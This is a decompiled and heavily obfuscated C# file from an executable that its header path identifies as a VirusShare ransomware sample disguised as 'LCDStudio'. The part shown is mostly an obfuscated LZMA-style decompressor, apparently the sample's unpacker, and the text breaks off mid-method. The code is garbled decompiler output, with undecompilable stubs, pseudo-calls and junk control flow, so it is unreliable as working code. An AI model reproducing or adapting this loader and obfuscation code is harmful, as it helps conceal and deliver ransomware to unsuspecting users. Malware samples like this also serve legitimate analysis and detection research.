// Decompiled with JetBrains decompiler
// Type: ᒆꟸ䇽ხ蚻蔦
// Assembly: LCDStudio, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BEF96371-2C95-4469-8D1E-06EE21BF714F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00027-msil\HEUR-Trojan-Ransom.Win32.Generic-69add888bcdeed2c14f525f23fa52a141f1afbd420b0fdd38202e5031b3635df.exe

using System;
using System.Diagnostics;
using System.IO;

public class \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦
{
  private const uint 抾讼肜濳ꯆ䗓媃춳 = 12;
  private const int 礧ꦧ瓔뱞骭\uEFF9ࢣ\uFFFD = 6;
  private const uint 㑉㤙텏ꝱ푇竒\uFFFD튳 = 4;
  private const uint 囒쑮暠\u2983턣똷\uF0EA忤 = 2;
  private const int 妋倧憤衰멡\uE611쯃鳖 = 4;
  private const uint 魸痈팁餇䬐뾰㺣溥 = 16;
  private const uint 翁\uEF8C쿌\uFFFD핦쩅벋ਥ = 4;
  private const uint \u24BF\uE344ᡦ琶\uFFFD䯲뮎틦 = 14;
  private const uint 綕䴬놇蚸\uF1A0ｘ\uF5A6Ⴚ = 128;
  private const int 䟽\u0FCF䟹တ\uE035抮\uE6C9\u0FC5 = 4;
  private const uint 䖫\uA876\uE227釻叆ﷺ\u08D4틉 = 16;
  private const int \uE58A\u2B9A䆏䌨\uE91A曺ﰸ䍟 = 3;
  private const int 俵\uE562ꏭ笋李䁲㣥ꊓ = 3;
  private const int 隘훤忲囻鴜\u22D4ⱡ쓆 = 8;
  private const uint \uF42D痆\uE204釧閴掸캓ﾵ = 8;
  private const uint 壇䡰俕閝ꄿ嘆견挞 = 8;

  private static uint 厕츨磀텼ℚ㽣닟\u2BD0(uint _param0)
  {
    // ISSUE: unable to decompile the method.
  }

  public \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦()
  {
label_0:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }

  private struct 鲘잉䡦ξꕒ틃ᒛ\u2569
  {
    public uint 졩댬\u208C轰\u17FEᖺﺚ䜘;

    public void \u2688\u09F2暜\u0C76聲\uF57B荑髪() => this.졩댬\u208C轰\u17FEᖺﺚ䜘 = 0U;

    public void \uF5EE\uFFFD\uA7F6羜\uF48C拣頄鑪()
    {
label_0:
      int num1 = (int) this.졩댬\u208C轰\u17FEᖺﺚ䜘;
      int num2;
      if (true)
      {
        if ((uint) num1 < 4U)
        {
          this.졩댬\u208C轰\u17FEᖺﺚ䜘 = 0U;
          num2 = 3;
          goto label_12;
        }
        else
          goto label_13;
      }
label_2:
      switch (num1)
      {
        case 0:
          goto label_0;
        case 2:
          goto label_13;
        case 3:
          return;
        case 4:
          return;
        case 5:
          this.졩댬\u208C轰\u17FEᖺﺚ䜘 -= 3U;
          num2 = false ? 2 : 1;
          break;
        default:
          if (false)
            ;
          return;
      }
label_12:
      num1 = num2;
      goto label_2;
label_13:
      if (this.졩댬\u208C轰\u17FEᖺﺚ䜘 >= 10U)
      {
        this.졩댬\u208C轰\u17FEᖺﺚ䜘 -= 6U;
        num2 = 4;
        goto label_12;
      }
      else
      {
        num2 = 5;
        if (false)
          goto label_12;
        else
          goto label_12;
      }
    }

    public void 졈勫馃넞￻걞\u22ED\u2F31()
    {
label_0:
      this.졩댬\u208C轰\u17FEᖺﺚ䜘 = this.졩댬\u208C轰\u17FEᖺﺚ䜘 < 7U ? 7U : 10U;
      int num1;
      int num2;
      do
      {
        num2 = 1;
        if (num2 != 0)
        {
          num1 = num2;
          if (false)
            goto label_6;
        }
        else
          goto label_5;
      }
      while (false);
      goto label_8;
label_6:
      return;
label_5:
      switch (num2)
      {
        case 0:
          goto label_0;
        case 1:
          return;
        default:
          return;
      }
label_8:
      num2 = num1;
      goto label_5;
    }

    public void \u0F7C忷\uEED5쉤싈焁쿸碮()
    {
label_0:
      this.졩댬\u208C轰\u17FEᖺﺚ䜘 = this.졩댬\u208C轰\u17FEᖺﺚ䜘 < 7U ? 8U : 11U;
      int num1;
      int num2;
      do
      {
        num2 = 1;
        if (num2 != 0)
        {
          num1 = num2;
          if (false)
            goto label_6;
        }
        else
          goto label_5;
      }
      while (false);
      goto label_8;
label_6:
      return;
label_5:
      switch (num2)
      {
        case 0:
          goto label_0;
        case 1:
          return;
        default:
          return;
      }
label_8:
      num2 = num1;
      goto label_5;
    }

    public void \u28D5ꕽ\uF6C5\uF3A4\u1AEAᘗ\uE903\uA4CD()
    {
label_0:
      if (true)
        this.졩댬\u208C轰\u17FEᖺﺚ䜘 = this.졩댬\u208C轰\u17FEᖺﺚ䜘 < 7U ? 9U : 11U;
      else
        goto label_7;
label_2:
      if (true)
        goto label_8;
label_3:
      int num;
      do
      {
        if (true)
        {
          switch (num)
          {
            case 0:
              goto label_0;
            default:
              continue;
          }
        }
        else
          goto label_0;
      }
      while (false);
      return;
label_8:
      num = 1;
      goto label_3;
label_7:
      if (false)
        goto label_2;
    }

    public bool 咨\uF2CB诣㤆啸\uE099䔧ᬷ() => this.졩댬\u208C轰\u17FEᖺﺚ䜘 < 7U;
  }

  public class 玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯
  {
    private byte[] 샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥;
    private uint \u2947\u2927笱鈺\uF85C\u236B䴗従;
    private uint 肘\uEA83\u19EC姘㲉穁\uE414ử;
    private uint 矘\u28DC\uE738㜨ổ䳽㟱ꂅ;
    private Stream \u0DF9\uF199\u2845肀ꮎ樱\u2065癰;

    public void \uE2AF莾īˀ뚷\uF7CD肩拄(uint _param1)
    {
label_0:
      int num1 = (int) this.肘\uEA83\u19EC姘㲉穁\uE414ử;
      int num2;
      while (true)
      {
        int num3 = (int) _param1;
        if (num1 != num3)
        {
          this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥 = new byte[(IntPtr) _param1];
          num2 = 2;
          if (num2 != 0)
          {
            if (num2 == 0)
              num1 = num2;
            else
              goto label_10;
          }
          else
            num1 = num2;
        }
        else
          break;
      }
label_4:
      int num4;
      if (true)
      {
        this.肘\uEA83\u19EC姘㲉穁\uE414ử = _param1;
        num4 = 3;
        goto label_11;
      }
label_7:
      // ISSUE: field reference
      RuntimeFieldHandle runtimeFieldHandle = __fieldref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯.肘\uEA83\u19EC姘㲉穁\uE414ử);
      return;
label_10:
      num4 = num2;
label_11:
      while (true)
      {
        switch (num4)
        {
          case 0:
            goto label_0;
          case 2:
            goto label_4;
          case 3:
            this.\u2947\u2927笱鈺\uF85C\u236B䴗従 = 0U;
            num4 = 1;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      this.矘\u28DC\uE738㜨ổ䳽㟱ꂅ = 0U;
      if (false)
        goto label_7;
    }

    public void \u2688\u09F2暜\u0C76聲\uF57B荑髪(Stream _param1, bool _param2)
    {
label_0:
      if (false)
        goto label_4;
      else
        goto label_8;
label_2:
      int num1;
      int num2;
      switch (num2)
      {
        case 0:
          goto label_0;
        case 2:
          break;
        case 3:
          goto label_5;
        default:
          this.矘\u28DC\uE738㜨ổ䳽㟱ꂅ = 0U;
          if (true)
          {
            this.\u2947\u2927笱鈺\uF85C\u236B䴗従 = 0U;
            num1 = 2;
            goto label_9;
          }
          else
            goto label_5;
      }
label_4:
      if (true)
        return;
label_5:
      int num3 = _param2 ? 1 : 0;
      num1 = 2;
      if (num3 == 0)
      {
        int num4 = 1;
        if (num4 == 0)
        {
          num2 = num4;
          goto label_2;
        }
        else
        {
          num1 = num4;
          goto label_9;
        }
      }
      else
        goto label_9;
label_8:
      this.\u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺();
      this.\u0DF9\uF199\u2845肀ꮎ樱\u2065癰 = _param1;
      num1 = 3;
label_9:
      num2 = num1;
      goto label_2;
    }

    public void \u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺()
    {
label_0:
      if (true)
        goto label_9;
label_4:
      int num;
      while (true)
      {
        do
          ;
        while (false);
        switch (num)
        {
          case 0:
            goto label_0;
          case 2:
            \u0016.\u0018((Array) new byte[this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥.Length], 0, (Array) this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥, 0, this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥.Length);
            num = 1;
            continue;
          case 3:
            this.\u0DF9\uF199\u2845肀ꮎ樱\u2065癰 = (Stream) null;
            num = 2;
            continue;
          default:
            if (false)
            {
              // ISSUE: field reference
              RuntimeFieldHandle runtimeFieldHandle = __fieldref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯.肘\uEA83\u19EC姘㲉穁\uE414ử);
              if (true)
                ;
              Debugger.Break();
              continue;
            }
            goto label_7;
        }
      }
label_7:
      return;
label_9:
      if (true)
        goto label_10;
label_1:
      num = 3;
      goto label_4;
label_10:
      this.\u2808昽\u22E2钼鲭Ⳇൢ픘();
      goto label_1;
    }

    public unsafe void \u2808昽\u22E2钼鲭Ⳇൢ픘()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
label_12:
      *(int*) voidPtr = (int) this.\u2947\u2927笱鈺\uF85C\u236B䴗従 - (int) this.矘\u28DC\uE738㜨ổ䳽㟱ꂅ;
      int num = (int) *(uint*) voidPtr;
      if (true)
      {
        if (num != 0)
        {
          \u001D.\u007E\u0080((object) this.\u0DF9\uF199\u2845肀ꮎ樱\u2065癰, this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥, (int) this.矘\u28DC\uE738㜨ổ䳽㟱ꂅ, (int) *(uint*) voidPtr);
          *(int*) ((IntPtr) voidPtr + 4) = 1;
          goto label_14;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          goto label_14;
        }
      }
label_2:
      switch (num)
      {
        case 0:
          goto label_12;
        case 2:
label_6:
          if (false)
            return;
          this.\u2947\u2927笱鈺\uF85C\u236B䴗従 = 0U;
          break;
        case 3:
          return;
        case 4:
          this.矘\u28DC\uE738㜨ổ䳽㟱ꂅ = this.\u2947\u2927笱鈺\uF85C\u236B䴗従;
          return;
        default:
          if (true)
          {
            int 笱鈺䴗従 = (int) this.\u2947\u2927笱鈺\uF85C\u236B䴗従;
            int 肘姘㲉穁Ử = (int) this.肘\uEA83\u19EC姘㲉穁\uE414ử;
            *(int*) ((IntPtr) voidPtr + 4) = 4;
            if ((uint) 笱鈺䴗従 >= (uint) 肘姘㲉穁Ử)
            {
              *(int*) ((IntPtr) voidPtr + 4) = 2;
              goto label_14;
            }
            else
              goto label_14;
          }
          else
            break;
      }
      *(int*) ((IntPtr) voidPtr + 4) = 4;
      if (false)
        goto label_6;
label_14:
      num = *(int*) ((IntPtr) voidPtr + 4);
      goto label_2;
    }

    public void 烏\uE510᳑\u0E6E\u319F\uF1CB椊阸(uint 궜嗣웥㜉뵲詧椕钁, uint _param2)
    {
label_0:
      uint num1 = (uint) ((int) this.\u2947\u2927笱鈺\uF85C\u236B䴗従 - (int) 궜嗣웥㜉뵲詧椕钁 - 1);
label_1:
      int num2 = 5;
      while (true)
      {
        do
        {
          int num3;
          int num4;
          switch (num2)
          {
            case 0:
              goto label_0;
            case 2:
              this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥[(IntPtr) this.\u2947\u2927笱鈺\uF85C\u236B䴗従++] = this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥[(IntPtr) num1++];
              int 笱鈺䴗従 = (int) this.\u2947\u2927笱鈺\uF85C\u236B䴗従;
              int 肘姘㲉穁Ử1 = (int) this.肘\uEA83\u19EC姘㲉穁\uE414ử;
              num2 = 3;
              if ((uint) 笱鈺䴗従 < (uint) 肘姘㲉穁Ử1)
                continue;
              break;
            case 3:
              num3 = (int) _param2;
              num4 = 1;
              if (num4 != 0)
              {
                _param2 = (uint) (num3 - num4);
                goto label_6;
              }
              else
                goto label_7;
            case 4:
              goto label_9;
            case 5:
              if (num1 < this.肘\uEA83\u19EC姘㲉穁\uE414ử)
                goto label_6;
              else
                goto label_11;
            case 6:
              num1 += this.肘\uEA83\u19EC姘㲉穁\uE414ử;
              if (false)
                goto label_1;
              else
                goto label_6;
            case 7:
              goto label_15;
            default:
              goto label_17;
          }
label_3:
          num2 = 1;
          continue;
label_6:
          int num5 = (int) _param2;
          num4 = 0;
          num3 = num5;
label_7:
          if ((uint) num3 > (uint) num4)
          {
            int num6 = (int) num1;
            int 肘姘㲉穁Ử2 = (int) this.肘\uEA83\u19EC姘㲉穁\uE414ử;
            num2 = 2;
            if ((uint) num6 >= (uint) 肘姘㲉穁Ử2)
            {
              num2 = 4;
              if (false)
                goto label_3;
            }
          }
          else
            goto label_8;
        }
        while (false);
        continue;
label_8:
        num2 = 7;
        continue;
label_9:
        num1 = 0U;
        num2 = 2;
        continue;
label_11:
        num2 = 6;
        continue;
label_17:
        this.\u2808昽\u22E2钼鲭Ⳇൢ픘();
        num2 = 3;
      }
label_15:;
    }

    public void \uF2E7恡أﲢ\u0DCD\uEB85ੴ퉬(byte _param1)
    {
label_0:
      int num1;
      if (true)
      {
        byte[] 샱縨䫃곥 = this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥;
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.玾\u0CD9\uE1B4榉羏\uE22A\u330F쮯 玾榉羏쮯 = this;
        int 笱鈺䴗従;
        uint num2 = (uint) (笱鈺䴗従 = (int) 玾榉羏쮯.\u2947\u2927笱鈺\uF85C\u236B䴗従);
        玾榉羏쮯.\u2947\u2927笱鈺\uF85C\u236B䴗従 = (uint) (笱鈺䴗従 + 1);
        uint index = num2;
        int num3 = (int) _param1;
        샱縨䫃곥[(IntPtr) index] = (byte) num3;
        num1 = 1;
      }
      while (true)
      {
        int num4 = num1;
        int num5;
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_0;
            case 2:
              goto label_4;
            default:
              if (this.\u2947\u2927笱鈺\uF85C\u236B䴗従 >= this.肘\uEA83\u19EC姘㲉穁\uE414ử)
              {
                this.\u2808昽\u22E2钼鲭Ⳇൢ픘();
                num5 = 2;
                if (num5 == 0)
                {
                  num4 = num5;
                  continue;
                }
                goto label_6;
              }
              else
                goto label_2;
          }
        }
label_6:
        num1 = num5;
      }
label_4:
      return;
label_2:;
    }

    public unsafe byte 櫈Ӷꓵ䔓\u24D2Ⲳ誌姼(uint 궜嗣웥㜉뵲詧椕钁)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(8);
label_6:
        *(int*) voidPtr = (int) this.\u2947\u2927笱鈺\uF85C\u236B䴗従 - (int) 궜嗣웥㜉뵲詧椕钁 - 1;
        *(int*) ((IntPtr) voidPtr + 4) = 1;
        while (true)
        {
          switch (*(int*) ((IntPtr) voidPtr + 4))
          {
            case 0:
              goto label_6;
            case 2:
              goto label_3;
            default:
              if (*(uint*) voidPtr >= this.肘\uEA83\u19EC姘㲉穁\uE414ử)
              {
                *(int*) ((IntPtr) voidPtr + 4) = 2;
                continue;
              }
              goto label_5;
          }
        }
      }
label_2:
      Debugger.Break();
label_3:
      if (true)
        *(int*) voidPtr = (int) *(uint*) voidPtr + (int) this.肘\uEA83\u19EC姘㲉穁\uE414ử;
      else
        goto label_2;
label_5:
      return this.샱縨\u3195\u0DF7䫃\u1A9A\uFFFD곥[(IntPtr) *(uint*) voidPtr];
    }
  }

  public class 藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏
  {
    public const uint \u24BCꢡ제\u21DD\u28A1듂\u232F榗 = 16777216;
    public uint Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ;
    public uint Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5;
    public Stream \u0CDC㡸떺洲\u0EF6멎劺巏;

    public unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪(Stream _param1)
    {
      int num1 = 8;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
label_15:
        this.\u0CDC㡸떺洲\u0EF6멎劺巏 = _param1;
        *(int*) ((IntPtr) voidPtr + 4) = 4;
        int num2;
        while (true)
        {
          do
          {
            int num3;
            do
            {
              num2 = *(int*) ((IntPtr) voidPtr + 4);
              if (true)
              {
                switch (num2)
                {
                  case 0:
                    goto label_15;
                  case 2:
                    if (false)
                      goto case 7;
                    else
                      goto label_5;
                  case 3:
                    *(int*) voidPtr = 0;
                    *(int*) ((IntPtr) voidPtr + 4) = 7;
                    if (false)
                      goto default;
                    else
                      continue;
                  case 4:
                    goto label_7;
                  case 5:
                    this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 << 8 | (uint) (byte) \u0018.\u007E\u001A((object) this.\u0CDC㡸떺洲\u0EF6멎劺巏);
                    if (false)
                    {
                      if (false)
                        goto case 7;
                      else
                        goto label_13;
                    }
                    else
                      goto label_9;
                  case 6:
                    goto label_11;
                  case 7:
                    num3 = *(int*) voidPtr;
                    *(int*) ((IntPtr) voidPtr + 4) = 5;
                    continue;
                  default:
                    *(int*) voidPtr = *(int*) voidPtr + 1;
                    goto case 7;
                }
              }
              else
                goto label_14;
            }
            while (num3 < 5);
            goto label_3;
label_13:;
          }
          while (false);
          goto label_10;
label_3:
          *(int*) ((IntPtr) voidPtr + 4) = 6;
          continue;
label_5:
          this.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ = uint.MaxValue;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          continue;
label_7:
          this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = 0U;
          *(int*) ((IntPtr) voidPtr + 4) = 2;
          continue;
label_9:
          *(int*) ((IntPtr) voidPtr + 4) = 1;
        }
label_14:
        num1 = num2;
      }
label_11:
      return;
label_10:;
    }

    public void \u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺()
    {
label_0:
      int num;
      if (false)
      {
        if (true)
          return;
        if (true)
        {
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏.\u002Ector);
          num = 352910108 * 989399265;
        }
      }
      else
      {
        this.\u0CDC㡸떺洲\u0EF6멎劺巏 = (Stream) null;
        do
        {
          num = 1;
        }
        while (false);
      }
      switch (num)
      {
        case 0:
          goto label_0;
      }
    }

    public void \uEB54㮩ꙻ빀碖腐\uFFFD锢()
    {
label_0:
      int num1 = 3;
      int num2;
      if (num1 != 0)
        num2 = num1;
      else
        goto label_13;
label_12:
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_0;
          case 2:
            goto label_6;
          case 3:
            if (false)
            {
              if (true)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏.\u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺);
                if (true)
                  ;
                Debugger.Break();
                continue;
              }
              goto label_0;
            }
            else
              goto label_9;
          default:
            goto label_4;
        }
      }
label_4:
      do
      {
        this.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ <<= 8;
        num2 = 3;
      }
      while (false);
      goto label_12;
label_6:
      while (false)
      {
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏.\u0FA4寘\uFFFDᜨ䫝\uFAF0䱗쓺);
      }
      this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 << 8 | (uint) (byte) \u0018.\u007E\u001A((object) this.\u0CDC㡸떺洲\u0EF6멎劺巏);
      num1 = 1;
      goto label_13;
label_9:
      if (this.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ >= 16777216U)
        return;
      goto label_6;
label_13:
      num2 = num1;
      goto label_12;
    }

    public unsafe uint 篘쿭껪뉹垾袑퇧ᆾ(int _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
label_10:
      *(int*) voidPtr = (int) this.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ;
      *(int*) ((IntPtr) voidPtr + 20) = 2;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 20))
        {
          case 0:
            goto label_10;
          case 2:
            *(int*) ((IntPtr) voidPtr + 4) = (int) this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5;
            *(int*) ((IntPtr) voidPtr + 20) = 1;
            continue;
          case 3:
            *(int*) ((IntPtr) voidPtr + 8) = (int) *(uint*) ((IntPtr) voidPtr + 8) << 1 | 1 - (int) *(uint*) ((IntPtr) voidPtr + 16);
            if (*(uint*) voidPtr < 16777216U)
            {
              *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) << 8 | (int) (byte) \u0018.\u007E\u001A((object) this.\u0CDC㡸떺洲\u0EF6멎劺巏);
              *(int*) voidPtr = (int) *(uint*) voidPtr << 8;
            }
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) - 1;
            *(int*) ((IntPtr) voidPtr + 20) = 7;
            continue;
          case 4:
            *(int*) ((IntPtr) voidPtr + 12) = _param1;
            goto case 7;
          case 5:
            *(int*) ((IntPtr) voidPtr + 4) = (int) *(uint*) ((IntPtr) voidPtr + 4) - ((int) *(uint*) voidPtr & (int) *(uint*) ((IntPtr) voidPtr + 16) - 1);
            *(int*) ((IntPtr) voidPtr + 20) = 3;
            continue;
          case 6:
            goto label_7;
          case 7:
            if (*(int*) ((IntPtr) voidPtr + 12) > 0)
            {
              *(int*) voidPtr = (int) (*(uint*) voidPtr >> 1);
              *(int*) ((IntPtr) voidPtr + 16) = (int) (*(uint*) ((IntPtr) voidPtr + 4) - *(uint*) voidPtr >> 31);
              *(int*) ((IntPtr) voidPtr + 20) = 5;
              continue;
            }
            *(int*) ((IntPtr) voidPtr + 20) = 6;
            continue;
          default:
            *(int*) ((IntPtr) voidPtr + 8) = 0;
            *(int*) ((IntPtr) voidPtr + 20) = 4;
            continue;
        }
      }
label_7:
      this.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ = *(uint*) voidPtr;
      this.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = *(uint*) ((IntPtr) voidPtr + 4);
      return *(uint*) ((IntPtr) voidPtr + 8);
    }

    public 藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏()
    {
label_0:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      switch (1)
      {
        case 0:
          goto label_0;
      }
    }
  }

  public struct 齌㼪ॉ\uFE4B콳ᩬ禼ဏ
  {
    public const int 빍\uF868ꈯ\u2EA1䣄Ἅ骗ᤳ = 11;
    public const uint 딵쵂\uF22D᪸鰆黟욏ꕃ = 2048;
    private const int 枖ﾋ鿕涡㛓꺜儿ꔤ = 5;
    private uint \uE6E2曣䧅᪳鸈\uEEFF７㦤;

    public void \u2688\u09F2暜\u0C76聲\uF57B荑髪()
    {
label_0:
      int num;
      if (false)
      {
        if (true)
          return;
        if (true)
        {
          // ISSUE: field reference
          RuntimeFieldHandle runtimeFieldHandle = __fieldref (\uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ.\uE6E2曣䧅᪳鸈\uEEFF７㦤);
          num = 1596348461 - 1545148122;
        }
      }
      else
      {
        this.\uE6E2曣䧅᪳鸈\uEEFF７㦤 = 1024U;
        do
        {
          num = 1;
        }
        while (false);
      }
      switch (num)
      {
        case 0:
          goto label_0;
      }
    }

    public unsafe uint 䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(
      \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
label_10:
      *(int*) voidPtr = (int) (_param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ >> 11) * (int) this.\uE6E2曣䧅᪳鸈\uEEFF７㦤;
      if (_param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 >= *(uint*) voidPtr)
      {
        _param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ -= *(uint*) voidPtr;
        _param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 -= *(uint*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 4) = 4;
      }
      else
        *(int*) ((IntPtr) voidPtr + 4) = 2;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 4))
        {
          case 0:
            goto label_10;
          case 2:
            _param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ = *(uint*) voidPtr;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            continue;
          case 3:
            this.\uE6E2曣䧅᪳鸈\uEEFF７㦤 += 2048U - this.\uE6E2曣䧅᪳鸈\uEEFF７㦤 >> 5;
            if (_param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ < 16777216U)
            {
              _param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = _param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 << 8 | (uint) (byte) \u0018.\u007E\u001A((object) _param1.\u0CDC㡸떺洲\u0EF6멎劺巏);
              *(int*) ((IntPtr) voidPtr + 4) = 1;
              continue;
            }
            goto label_8;
          case 4:
            goto label_5;
          case 5:
            goto label_8;
          default:
            _param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ <<= 8;
            *(int*) ((IntPtr) voidPtr + 4) = 5;
            continue;
        }
      }
label_5:
      this.\uE6E2曣䧅᪳鸈\uEEFF７㦤 -= this.\uE6E2曣䧅᪳鸈\uEEFF７㦤 >> 5;
      if (_param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ < 16777216U)
      {
        _param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 = _param1.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5 << 8 | (uint) (byte) \u0018.\u007E\u001A((object) _param1.\u0CDC㡸떺洲\u0EF6멎劺巏);
        _param1.Ⅼ嚰\uEA4A荇痊蕡\uE386ᶤ <<= 8;
      }
      return 1;
label_8:
      return 0;
    }
  }

  public struct 텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879
  {
    private \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[] 룳\u2950᱀攽蝻\uE183倰䍌;
    private int \uE783ੱ\uE861\uEE3D牦ⴸᗄ澴;

    public 텿\u0589睓ۥ\u2D2C\uF51Aᛀ\uA879(int numBitLevels)
    {
      this.\uE783ੱ\uE861\uEE3D牦ⴸᗄ澴 = numBitLevels;
      this.룳\u2950᱀攽蝻\uE183倰䍌 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.齌㼪ॉ\uFE4B콳ᩬ禼ဏ[1 << numBitLevels];
    }

    public unsafe void \u2688\u09F2暜\u0C76聲\uF57B荑髪()
    {
      int num1 = 8;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
label_2:
        if (true)
          goto label_12;
label_10:
        *(int*) ((IntPtr) voidPtr + 4) = 3;
        goto label_13;
label_12:
        *(int*) voidPtr = 1;
        *(int*) ((IntPtr) voidPtr + 4) = 2;
label_13:
        int num2;
        int num3;
        while (true)
        {
          long num4;
          long num5;
          do
          {
            num2 = *(int*) ((IntPtr) voidPtr + 4);
            if (true)
            {
              switch (num2)
              {
                case 0:
                  goto label_2;
                case 2:
                  goto label_5;
                case 3:
                  num3 = (int) *(uint*) voidPtr;
                  if (true)
                  {
                    num4 = (long) (uint) num3;
                    num5 = (long) (1 << this.\uE783ੱ\uE861\uEE3D牦ⴸᗄ澴);
                    *(int*) ((IntPtr) voidPtr + 4) = 1;
                    continue;
                  }
                  goto label_15;
                case 4:
                  goto label_9;
                case 5:
                  goto label_4;
                default:
                  goto label_14;
              }
            }
            else
              goto label_11;
          }
          while (num4 < num5);
          goto label_8;
label_5:
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = 5;
          continue;
label_14:
          this.룳\u2950᱀攽蝻\uE183倰䍌[(IntPtr) *(uint*) voidPtr].\u2688\u09F2暜\u0C76聲\uF57B荑髪();
          *(int*) ((IntPtr) voidPtr + 4) = 4;
        }
label_11:
        num1 = num2;
        continue;
label_15:
        num1 = num3;
        continue;
label_9:
        *(int*) voidPtr = (int) *(uint*) voidPtr + 1;
        goto label_10;
      }
label_4:;
    }

    public unsafe uint 䴚\u2EF9君\uFFFD\uED3E\uFFFD\uEF1A\uEEFC(
      \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.藙\u2EC9\uFFFD\uFE58\uF837Ḑ俔筏 _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_5:
      *(int*) voidPtr = 1;
